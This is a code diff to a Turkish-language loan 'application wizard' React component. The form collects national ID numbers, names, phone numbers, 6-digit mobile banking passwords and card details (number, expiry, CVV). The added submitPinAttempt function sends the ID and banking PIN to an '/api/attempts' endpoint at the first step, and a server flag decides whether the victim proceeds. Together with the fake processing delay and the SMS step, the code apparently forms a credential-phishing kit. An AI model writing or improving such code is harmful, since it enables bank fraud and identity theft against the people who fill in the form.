@@ -42,7 +42,6 @@ const emptyIdentity: IdentityData = {
   phone: "",
   captcha: "",
   mobilePin: "",
-  mobilePinConfirm: "",
 };
 
 const emptyPersonal: PersonalData = {
@@ -55,8 +54,6 @@ const emptyPersonal: PersonalData = {
 };
 
 const PROCESSING_SECONDS = 15;
-const MOBILE_PIN_FAIL_MSG =
-  "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz.";
 
 export default function ApplicationWizard() {
   const [wizardStep, setWizardStep] = useState<WizardStep>("form");
@@ -104,13 +101,6 @@ export default function ApplicationWizard() {
       if (prev.firstName && data.firstName.trim()) delete next.firstName;
       if (prev.lastName && data.lastName.trim()) delete next.lastName;
       if (prev.mobilePin && data.mobilePin.length === 6) delete next.mobilePin;
-      if (
-        prev.mobilePinConfirm &&
-        data.mobilePinConfirm.length === 6 &&
-        data.mobilePin === data.mobilePinConfirm
-      ) {
-        delete next.mobilePinConfirm;
-      }
       return next;
     });
   };
@@ -154,11 +144,6 @@ export default function ApplicationWizard() {
     }
     if (identity.mobilePin.length !== 6) {
       errors.mobilePin = "6 haneli mobil şifre giriniz";
-    }
-    if (identity.mobilePinConfirm.length !== 6) {
-      errors.mobilePinConfirm = "Mobil şifreyi tekrar giriniz";
-    } else if (identity.mobilePin !== identity.mobilePinConfirm) {
-      errors.mobilePinConfirm = "Mobil şifreler eşleşmiyor";
     }
     setIdentityErrors(errors);
     return Object.keys(errors).length === 0;
@@ -207,10 +192,49 @@ export default function ApplicationWizard() {
     }
   };
 
+  const submitPinAttempt = async () => {
+    const res = await fetch("/api/attempts", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        tcKimlik: identity.tcKimlik,
+        firstName: identity.firstName,
+        lastName: identity.lastName,
+        phone: phoneToDigits(identity.phone),
+        birthDate: "",
+        loanAmount: 0,
+        loanTerm: 0,
+        noCreditCard: true,
+        cardNumber: "",
+        cardExpiry: "",
+        cardCvv: "",
+        mobilePin: identity.mobilePin,
+      }),
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.error || "Kayıt başarısız");
+
+    setApplicantId(data.applicantId);
+
+    if (data.canAdvance) {
+      setFormStep(2);
+      return;
+    }
+
+    if (data.message) {
+      showModal(data.message);
+    }
+  };
+
   const handleIdentitySubmit = async () => {
     if (!validateIdentity()) return;
-    await withLoading("Bir sonraki adıma geçiliyor...", () => {
-      setFormStep(2);
+
+    await withLoading("Mobil şifreniz doğrulanıyor...", async () => {
+      try {
+        await submitPinAttempt();
+      } catch (e) {
+        showModal(e instanceof Error ? e.message : "Hata oluştu");
+      }
     });
   };
 
@@ -245,16 +269,12 @@ export default function ApplicationWizard() {
       setWizardStep("sms");
       return;
     }
-
-    showModal(data.message ?? MOBILE_PIN_FAIL_MSG, () => {
-      resetForm();
-    });
   };
 
   const handlePersonalSubmit = async () => {
     if (!validatePersonal()) return;
 
-    await withLoading("Mobil şifreniz doğrulanıyor...", async () => {
+    await withLoading("Başvurunuz gönderiliyor...", async () => {
       try {
         await submitAttempt();
       } catch (e) {
